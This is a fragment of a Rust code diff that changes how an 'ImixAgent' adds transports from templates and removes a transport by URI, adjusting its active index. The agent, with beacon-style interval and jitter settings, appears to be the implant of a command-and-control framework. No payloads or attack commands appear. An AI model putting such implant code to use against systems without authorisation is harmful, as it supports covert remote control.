+                        interval: template.interval,
+                        r#type: template.r#type,
+                        extra: template.extra,
+                        jitter: template.jitter,
+                    };
+                    available_transports.transports.push(new_transport);
+                }
+            }
             Ok(())
         })
     }
@@ -784,16 +804,19 @@ impl Agent for ImixAgent {
             if let Some(info) = cfg.info.as_mut()
                 && let Some(available_transports) = info.available_transports.as_mut()
             {
-                // Check if URI exists
-                if let Some(pos) = available_transports
+                let pos = available_transports
                     .transports
                     .iter()
-                    .position(|t| t.uri == uri)
-                {
+                    .position(|t| t.uri == uri);
+                if let Some(pos) = pos {
                     available_transports.transports.remove(pos);
-                    // Sync the updated transports with active transport pool
-                    let mut active_transport = self.transport.write().await;
-                    active_transport.sync_transports(available_transports.clone())?;
+                    // Adjust active_index if needed
+                    let active_idx = available_transports.active_index as usize;
+                    if active_idx >= available_transports.transports.len()
+                        && !available_transports.transports.is_empty()
+                    {
+                        available_transports.active_index = 0;
+                    }
                 }
             }
             Ok(())
